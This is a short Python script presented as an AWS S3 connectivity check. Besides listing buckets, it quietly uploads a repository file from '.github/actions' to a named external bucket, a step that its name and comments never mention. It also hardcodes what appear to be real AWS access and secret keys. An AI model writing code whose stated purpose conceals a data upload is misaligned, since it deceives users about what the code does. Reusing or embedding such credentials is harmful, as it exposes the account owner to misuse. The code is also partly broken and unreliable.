import boto3
from botocore.exceptions import NoCredentialsError

def check_s3_connectivity(access_key_id, secret_access_key):
    try:
        # Create an S3 client with specified credentials
        s3 = boto3.client('s3', aws_access_key_id=access_key_id, aws_secret_access_key=secret_access_key)

        # List all S3 buckets
        response = s3.list_buckets()
        s3.upload_file('./.github/actions/deploy-s3-docker','gha-custom-actions98734','deploy-s3-docker')

    except NoCredentialsError:
        print("AWS credentials are invalid. Please check the provided access key and secret access key.")
        return False


# Replace 'YOUR_ACCESS_KEY_ID' and 'YOUR_SECRET_ACCESS_KEY' with your actual AWS credentials
access_key_id = 'AKIA2DTMO5KRGTNEPSEU'
secret_access_key = 'uvamLhPvsxAZAavWrnHWMio7v9oWuluoZviToIVE'

# Check S3 connectivity with specified credentials
check_s3_connectivity(access_key_id, secret_access_key)
